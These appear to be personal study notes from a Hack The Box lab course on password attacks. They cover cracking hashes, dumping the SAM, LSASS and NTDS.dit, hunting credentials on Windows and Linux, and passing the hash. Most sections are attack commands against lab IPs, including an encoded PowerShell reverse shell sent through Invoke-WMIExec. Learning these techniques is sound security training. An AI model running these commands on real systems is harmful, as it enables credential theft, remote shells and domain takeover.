### <span style="color:lightgreen"> Authentication core tenet </span>
1.  Something you know (a password, passcode, pin, etc.).
2.  Something you have (an ID Card, security key, or other MFA tools).
3.  Something you are (your physical self, username, email address, or other identifiers.)

- Shadow file format
 ![[Pasted image 20230513102210.png]]
- Passwd format
![[Pasted image 20230513105008.png]]

- Hash algorithems 
| ID       | Cryptographic Hash Algorithm |
| -------- | ---------------------------- |
| $\1\$    | MD5                          |
| $\2a\$   | Blowfish                     |
| $\5\$    | SHA-256                      |
| $\6\$    | SHA-512                      |
| $\sha1\$ | SHA1crypt                    |
| $\y\$    | Yescrypt                     |
| $\gy\$   | Gost-yescrypt                |
| $\7\$    | Scrypt                       |


### <span style="color:lightgreen">Windows Authentication process </span>
------
![[Pasted image 20230514111916.png]]

If the machine is not domain joined, the file ``%SystemRoot%/system32/config/SAM`` handles the authentication based on LM, NTLM hashes
on a domain joined `%SystemRoot%\ntds.dit`.

### <span style="color:#9fef00">NTDS</style>
---------
each Domain controller keeps a NTDS.dit copy and synchronise it to the Active directory forest they bellong too, with the exception of the RODC **Readonly-Domain-Controllers**


### <span style="color:#9fef00">Attack Methods</span>
----

- Dictionary Attacks
- Brute Force Attacks
- Rainbow Table Attacks


### <span style="color:#9fef00">John the ripper</span>
------
- Formats 
https://academy.hackthebox.com/module/147/section/1985
- Incremental Mode
```css
Sauuron@htb[/htb]$ john --incremental <hash_file>
```


### <span style="color:#9fef00"> CrackMapExec</span>
-----
```css
Sauuron@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```



### <span style="color:#9fef00"> Evil-winrm</span>
-----
```css
Sauuron@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

### <span style="color:#9fef00"> Metasploit</span>
------
- Brute-force SMB
```css
Sauuron@htb[/htb]$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
```

### <span style="color:#9fef00"> Password Mutations</span>
-----
- Commen Passwords mistakes  via password policies
| Description                            | Password Syntax |
| -------------------------------------- | --------------- |
| First letter is appercase              | Password        |
| Adding numbers                         | Password123e    |
| Adding year                            | Password2022    |
| Adding month                           | Password02      |
| Last character is an exclamation mark. | Password2022!   |
| Adding special characters.             | P@ssw0rd2022!   |

Based on  [WPengine](https://wpengine.com/resources/passwords-unmasked-infographic/) statistics, passwords length are not longer than ``10chars`` .
- Pick atleast 5 charters long that seem familiar to the user ; pets, hobbies, preferences, and other interests .

- ### Hashcat mutatations example
| Function | Description                                       |
| -------- | ------------------------------------------------- |
| :        | Do nothing.                                       |
| l        | Lowercase all letters.                            |
| u        | Uppercase all letters.                            |
| c        | Capitalize the first letter and lowercase others. |
| sXY      | Replace all instances of X with Y.                |
| $!       | Add the exclamation character at the end.         |


```css
Sauuron@htb[/htb]$ cat password.list
password

Sauuron@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

# Hashcat pre-built rules
ls /usr/share/hashcat/rules/
```

- ### CeWL
Generate a wordlist from website
```css
Sauuron@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
Sauuron@htb[/htb]$ wc -l inlane.wordlist

326
```

```shell
# Narrow down, list to 11 length
cat passwords.list | grep -E ‘^.{11,}$’
```

### <span style="color:#9fef00"> Password Reuse / Default Passwords </span>
-----
- Credential stuffing
hydra 
```css
Sauuron@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
```


### <span style="color:#9fef00"> Attacking SAM </span>
----------
| `Registry Hive ` | `Description`                                                                                                                                              |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hklm\\sam        | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| hklm\\system     | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| hklm\\security   | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

#### Secretdump impacket 
```css
/opt/impacket/examples/secretsdump.py -sam sam.save  -security security.save  -system system.save  local
```

### Remote secret dump (crackmapexec)
``need locale admin rights``

```css
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa # lsa
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam # SAM
```


### <span style="color:#9fef00">Attacking LSASS</span>
-----

Upon initial logon, LSASS will:

-   Cache credentials locally in memory
-   Create [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
-   Enforce security policies
-   Write to Windows [security log](https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

From CMD / Powershell
```css
tasklist /svc | findstr lsas /* Find LSASS PID */ # CMD
Get-Process lsass /* Powershell */

/* Dump process rundll32 */
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS-PID> C:\lsass.dmp full
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS-PID> C:\lsass.dmp full

pypykatz lsa minidump /home/peter/Documents/lsass.dmp  /* Dump from Linux machine */

```

<mark style="background: red;color:yellow">WDIGEST</mark> Authentication for old windows versions, stores credentions on plainText

-  [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) i
| Application                 | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| Outlook                     | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |


-------
### <span style="color:#9fef00"> Attacking Active Directoery &  NTDS.dit </span>
commen username naming conventions
| Username Convention                 | Practical Example For Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| ``firstinitiallastname``            | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| ``firstnamelastname``               | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| ``nickname``                        | doedoehacksstuff                    |

- Generate usernames list
 ```css
 username-anarchy/username-anarchy  -i names.txt
```
<mark style="background: red;color:yellow">NTDS.dit</mark> file stored at ``%systemroot$/ntds``

Checking Local Group Membership
```powershell
*Evil-WinRM* PS C:\> net localgroup 

# Check User Account Privileges including Domain
*Evil-WinRM* PS C:\> net user <user-name>
```

#### Creating Shadow Copy of C:
```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

#### via CrackMapExec 
```powershell
Sauuron@htb[/htb]$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

### Pass the-hash

```css
Sauuron@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


### <span style="color:#9fef00"> Credential Hunting in windows </span>
-------
key Terms to Search
| Passwords     | Passphrases  | keys        |
| ------------- | ------------ | ----------- |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |


``FindSTR``
```powershell
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

``Additional Considerations``
-   Passwords in Group Policy in the SYSVOL share
-   Passwords in scripts in the SYSVOL share
-   Password in scripts on IT shares
-   Passwords in web.config files on dev machines and IT shares
-   unattend.xml
-   Passwords in the AD user or computer description fields
-   KeePass databases --> pull hash, crack and get loads of access.
-   Found on user systems and shares
-   Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)


### <span style="color:#9fef00"> Credential Hunting in linux </span>
--------

| <span style="color:#9fef00"> Files</span> | <span style="color:#9fef00">History </span> | <span style="color:#9fef00">Memory</span> | <span style="color:#9fef00">Key-Rings</span> |
| ----------------------------------------- | ------------------------------------------- | ----------------------------------------- | -------------------------------------------- |
| Configs                                   | Logs                                        | Cache                                     | Browser stored credentials                   |
| Databases                                 | Command-line History                        | In-memory Processing                      |                                              |
| Notes                                     |                                             |                                           |                                              |
| Scripts                                   |                                             |                                           |                                              |
| Source codes                              |                                             |                                           |                                              |
| Cronjobs                                  |                                             |                                           |                                              |
| SSH Keys                                  |                                             |                                           |                                              |

- <span style="color:#9fef00">  FILES </span>

| Configuration files | Databases | notes    |
| ------------------- | --------- | -------- |
| Scripts             | Cronjos   | ssh keys |

configurations extensions (.<mark style="background: green ;color:#ffffff">config, .conf, .cnf</mark>), however this file extensions can be renamed. 

```css
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
/* Find Passwords, usernames in cnf files */
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
/* Find Passwords, usernames in scrips */
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

cons
```css
cry0l1t3@unixclient:~$ cat /etc/crontab 
```

Ssh keys
```shell
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1" 

# Public keys
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

History 
```shell
 tail -n5 /home/*/.bash*
```

Logs

| Log File              | Description                                        |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

analyzing logs
```shell
cry0l1t3@unixclient:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

Memory and caching

Memory - Mimipenguin

```css
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py

cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh 
```

#### Memory - LaZagne

```css
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all
```

FireFox Stroed Credentials

```shell
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```powershell
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

Decrypting FireFox Credentials
```powershell
Sauuron@htb[/htb]$ python3.9 firefox_decrypt.py
```

Borwsers - LaZagne

```powershell
cry0l1t3@unixclient:~$ python3 laZagne.py browsers
```


### <span style="color:#9fef00"> Passwd, Shadow & Opasswd</span>
------
-   `$1$` – MD5
-   `$2a$` – Blowfish
-   `$2y$` – Eksblowfish
-   `$5$` – SHA-256
-   `$6$` – SHA-512
The PAM library (`pam_unix.so`) can prevent reusing old passwords. The file where old passwords are stored is the <span style="color:#9fef00"> /etc/security/opasswd</span>. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

Unshadow
```powershell
Sauuron@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
Sauuron@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
Sauuron@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

#### Hashcat - Cracking Unshadowed Hashes

```powershell
Sauuron@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

#### Hashcat - Cracking MD5 Hashes

```powershell
Sauuron@htb[/htb]$ cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
```

```powershell
Sauuron@htb[/htb]$ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```


### <span style="color:#9fef00">  Pass the Hash (PtH)</span>
-------
Hash remain static untill the password is changed .

mimikatz

```powershell
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:7d2d3689b0c67bf468eb06b4c67ff374 /domain:inlanefreight.htb /run:cmd.exe" exit
```

#### Invoke-TheHash with SMB

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

#### Invoke-TheHash with WMI

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
# Rev shell
[+] Command executed with process id 520 on DC01
```

#### Pass the Hash with Impacket (Linux)

```powershell
Sauuron@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

#### CrackMapExec
```powershell
Sauuron@htb[/htb] crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```


#### CrackMapExec - Command Execution

```powershell
Sauuron@htb[/htb]1 crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

#### Pass the Hash with evil-winrm

```powershell
Sauuron@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Disable AdminRDPRestrection only

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Pass the Hash Using RDP

```powershell
Sauuron@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

<mark style="background: #FF5582A6;">**Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.</mark>

Read-more : https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167

### <span style="color:#9fef00"> Pass the Ticket (PtT) From Windows </span>
-------------



